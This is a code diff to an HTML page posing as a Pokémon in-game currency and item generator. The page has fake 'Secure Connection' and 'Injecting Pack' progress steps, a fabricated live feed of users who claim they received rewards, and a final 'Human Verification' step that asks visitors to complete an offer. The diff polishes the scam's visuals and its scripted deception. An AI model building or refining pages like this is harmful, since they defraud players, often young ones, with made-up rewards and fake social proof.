@@ -56,8 +56,9 @@
         .input-ui {
             background: rgba(0, 0, 0, 0.6); border: 1px solid var(--primary);
             border-radius: 12px; padding: 18px; width: 100%; color: #fff;
-            font-size: 1rem; margin-bottom: 15px; box-sizing: border-box; outline: none;
+            font-size: 1rem; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s;
         }
+        .input-ui:focus { box-shadow: 0 0 15px var(--primary); }
 
         .grid-rewards { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
 
@@ -72,41 +73,51 @@
         }
 
         .reward-img { 
-            width: 75px; height: 75px; object-fit: contain; margin-bottom: 10px; 
+            width: 70px; height: 70px; object-fit: contain; margin-bottom: 10px; 
+            filter: drop-shadow(0 0 10px rgba(0,242,255,0.3));
             animation: float 3s ease-in-out infinite;
         }
 
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
 
-        .reward-card span { display: block; font-weight: 900; font-size: 1.2rem; }
-        .reward-card small { color: var(--primary); font-size: 0.75rem; font-weight: bold; }
+        .reward-card span { display: block; font-weight: 900; font-size: 1.2rem; margin-bottom: 2px; }
+        .reward-card small { color: var(--primary); font-size: 0.75rem; font-weight: bold; text-transform: uppercase; }
 
         .btn-action {
             background: linear-gradient(to right, var(--primary), #00a2ff);
             color: #000; width: 100%; padding: 20px; border: none; border-radius: 15px;
             font-weight: 900; font-size: 1.2rem; cursor: pointer; font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase; transition: 0.3s; margin-top: 10px;
+        }
+        .btn-action:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--primary); }
+
+        .activity-feed {
+            margin-top: 25px; padding: 12px; background: rgba(0,0,0,0.4); border-radius: 50px; 
+            font-size: 0.8rem; color: #00f2ff; border: 1px solid rgba(0,242,255,0.1);
         }
 
         .characters-showcase {
-            margin-top: 40px; display: flex; gap: 15px; overflow-x: auto; width: 100%; max-width: 500px;
+            margin-top: 40px; display: flex; gap: 15px; overflow-x: auto; width: 100%; max-width: 500px; padding-bottom: 10px;
         }
-
-        .char-item { min-width: 120px; text-align: center; background: var(--glass-bg); border-radius: 15px; padding: 10px; }
-        .char-item img { width: 100%; border-radius: 10px; }
-
-        .activity-feed {
-            margin-top: 25px; padding: 12px; background: rgba(0,0,0,0.4); border-radius: 50px; font-size: 0.8rem; color: #00f2ff;
-        }
+        .char-item { min-width: 110px; text-align: center; background: var(--glass-bg); border-radius: 15px; padding: 10px; border: 1px solid rgba(255,255,255,0.05); }
+        .char-item img { width: 100%; filter: drop-shadow(0 0 5px rgba(255,255,255,0.2)); }
+        .char-item p { font-size: 0.65rem; font-weight: bold; margin-top: 8px; color: var(--gold); }
 
         .hidden { display: none; }
-        .loader { width: 60px; height: 60px; border: 4px solid #111; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .loader { width: 50px; height: 50px; border: 4px solid #111; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        #progress-bar { height: 100%; background: var(--primary); transition: 0.3s; box-shadow: 0 0 10px var(--primary); }
     </style>
 </head>
 <body>
 
 <nav>
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
+    <div style="font-size: 0.7rem; text-align: right;">
+        <span style="color: #2ecc71;">● SERVER ONLINE</span><br>
+        <span style="color: #aaa;">REGION: USA-EAST</span>
+    </div>
 </nav>
 
 <div class="container">
@@ -114,45 +125,55 @@
         <div class="badge-pro">v4.2 Secured</div>
         
         <div id="ui-step1">
-            <h2 style="margin-top: 40px; color: var(--primary);">Global Distribution</h2>
+            <h2 style="margin-top: 40px; color: var(--primary); font-size: 1.5rem;">Global Distribution</h2>
+            <p style="color: #888; font-size: 0.8rem; margin-bottom: 25px;">Season 12: April 2026 Sync</p>
             <input type="text" class="input-ui" id="trainer-name" placeholder="Enter Trainer Username...">
+            <select class="input-ui">
+                <option>Platform: Android</option>
+                <option>Platform: iOS / iPhone</option>
+                <option>Platform: Nintendo Switch</option>
+            </select>
             <button class="btn-action" onclick="toStep2()">Secure Connection</button>
         </div>
 
         <div id="ui-step2" class="hidden">
-            <h3 style="margin-bottom: 20px;">2. SELECT ASSETS</h3>
+            <h3 style="margin-bottom: 20px; font-size: 1rem;">2. SELECT ASSETS</h3>
             <div class="grid-rewards">
                 <div class="reward-card" onclick="selectReward(this, '50,000 VP')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png" alt="VP" class="reward-img">
-                    <span>50,000</span><small>Victory Points</small>
+                    <span>50,000</span><small>VP Points</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/rare-candy.png" alt="Gems" class="reward-img">
-                    <span>10,000</span><small>Champion Gems</small>
+                    <span>10,000</span><small>Gems</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png" alt="Pass" class="reward-img">
-                    <span>S12</span><small>Elite Battle Pass</small>
+                    <span>S12</span><small>Elite Pass</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png" alt="Stone" class="reward-img">
-                    <span>OMNI</span><small>Evolution Stone</small>
+                    <span>OMNI</span><small>Stone</small>
                 </div>
             </div>
-            <button class="btn-action" onclick="toStep3()">Initiate Generator</button>
+            <button class="btn-action" onclick="toStep3()">Generate</button>
         </div>
 
-        <div id="ui-sync" class="hidden" style="padding: 40px 0;">
+        <div id="ui-sync" class="hidden" style="padding: 30px 0;">
             <div class="loader"></div>
-            <h4 id="status-text">Handshaking...</h4>
+            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Syncing Data...</h4>
             <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
-                <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.3s;"></div>
+                <div id="progress-bar" style="width: 0%;"></div>
             </div>
         </div>
 
         <div id="ui-locker" class="hidden">
-            <h3 style="color: var(--accent);">3. FINAL VERIFICATION</h3>
-            <p>Verification Pending for <span id="summary-res">Resources</span>...</p>
+            <h3 style="color: var(--accent);">Verification Required</h3>
+            <p style="font-size: 0.8rem; line-height: 1.5; color: #ccc;">To prevent abuse, please complete one offer to finalize the synchronization of <span id="summary-res" style="color:var(--primary); font-weight:bold;">Resources</span>.</p>
+            <div style="margin: 20px 0; padding: 20px; border: 2px dashed var(--primary); border-radius: 15px; background: rgba(0,242,255,0.05);">
+                <i class="fas fa-user-shield" style="font-size: 2rem; color: var(--primary);"></i>
+                <p style="font-weight: bold; margin-top: 10px;">Human Verification</p>
+                </div>
         </div>
 
         <div class="activity-feed">
@@ -164,13 +185,14 @@
         <div class="char-item"><img src="https://assets.pokemon.com/assets/cms2/img/pokedex/full/006.png"><p>MEGA-X</p></div>
         <div class="char-item"><img src="https://assets.pokemon.com/assets/cms2/img/pokedex/full/448.png"><p>LUCARIO</p></div>
         <div class="char-item"><img src="https://assets.pokemon.com/assets/cms2/img/pokedex/full/445.png"><p>GARCHOMP</p></div>
+        <div class="char-item"><img src="https://assets.pokemon.com/assets/cms2/img/pokedex/full/150.png"><p>MEWTWO</p></div>
     </div>
 </div>
 
 <script>
     let selectedItem = "Resources";
     function toStep2() {
-        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter Name');
+        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter Trainer Name');
         document.getElementById('ui-step1').classList.add('hidden');
         document.getElementById('ui-step2').classList.remove('hidden');
     }
@@ -184,16 +206,30 @@
         document.getElementById('ui-sync').classList.remove('hidden');
         document.getElementById('summary-res').innerText = selectedItem;
         let progress = 0;
+        const bar = document.getElementById('progress-bar');
+        const status = document.getElementById('status-text');
+        const messages = ["Connecting...", "Handshaking...", "Injecting Pack...", "Finalizing..."];
+        
         const interval = setInterval(() => {
-            progress += 5;
-            document.getElementById('progress-bar').style.width = progress + '%';
+            progress += 2;
+            bar.style.width = progress + '%';
+            if(progress % 25 === 0) status.innerText = messages[Math.floor(progress/25)-1] || "Finalizing...";
             if(progress >= 100) {
                 clearInterval(interval);
-                document.getElementById('ui-sync').classList.add('hidden');
-                document.getElementById('ui-locker').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('ui-sync').classList.add('hidden');
+                    document.getElementById('ui-locker').classList.remove('hidden');
+                }, 500);
             }
-        }, 150);
+        }, 100);
     }
+    
+    // Live Feed Simulation
+    setInterval(() => {
+        const users = ['Volt_King', 'Sarah_PKM', 'Ash_K12', 'Shadow_Red'];
+        const items = ['50,000 VP', '10,000 Gems', 'Elite Pass', 'Omni Stone'];
+        document.getElementById('live-text').innerText = `Trainer \`${users[Math.floor(Math.random()*4)]}\` successfully synced ${items[Math.floor(Math.random()*4)]}!`;
+    }, 4000);
 </script>
 </body>
 </html>
